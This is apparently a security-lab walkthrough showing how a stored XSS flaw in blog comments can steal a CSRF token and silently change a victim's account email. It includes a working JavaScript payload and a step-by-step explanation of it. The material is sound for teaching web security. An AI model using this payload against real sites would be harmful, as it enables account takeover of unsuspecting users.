## Solution steps

- Go to any blog post and check if it's vulnerable to XSS by using the following payload as a comment with random name and email: `<script>alert(1)</script>`
- Go back to the blog post and observe an alert has been triggered.
- Log in to your account with the given credentials.
- View it's page source and observe the line: ` <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">`
- We need to issue a `POST` request to `/my-account/change-email`, with a parameter called `email`.
- There's an `anti-CSRF` token in a hidden input called `token`: `<input required type="hidden" name="csrf" value="C7pHiBh4Nl606Yhf5vNCEXzpCRt9i6a8">`
- Our exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address.
- Submit the following payload in a blog comment to solve the lab:
  ```html
  <script>
  var req = new XMLHttpRequest();
  req.onload = handleResponse;
  req.open('get','/my-account',true);
  req.send();
  function handleResponse() {
      var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
      var changeReq = new XMLHttpRequest();
      changeReq.open('post', '/my-account/change-email', true);
      changeReq.send('csrf='+token+'&email=test@test.com')
  };
  </script>

### How the script works

1. Load the Account Page
   - The script sends a `GET` request to `/my-account`, which returns the HTML of the user's account page including the CSRF token in a hidden input field.
2. Extract the CSRF Token
   - The response is processed by `handleResponse()`. It uses a regular expression to extract the token from the HTML:
     ```html
     var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
3. Send the Malicious `POST` Request
   - A new `XMLHttpRequest` is made to `/my-account/change-email` with:
   - The extracted csrf token.
   - A new email (`test@test.com`).
4. Effect:
   - If a victim views the attacker's comment containing this script their email address will be silently changed to `test@test.com`.
